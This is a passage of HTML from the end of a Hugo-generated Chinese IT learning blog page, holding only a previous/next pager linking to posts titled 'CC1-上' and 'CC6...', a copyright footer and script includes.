</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/11a6f89e2f2f3c252b806858fc6cd036/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">CC1-上</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ab0b8f41320c5e9a9a2d520608badf7f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">CC6...</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>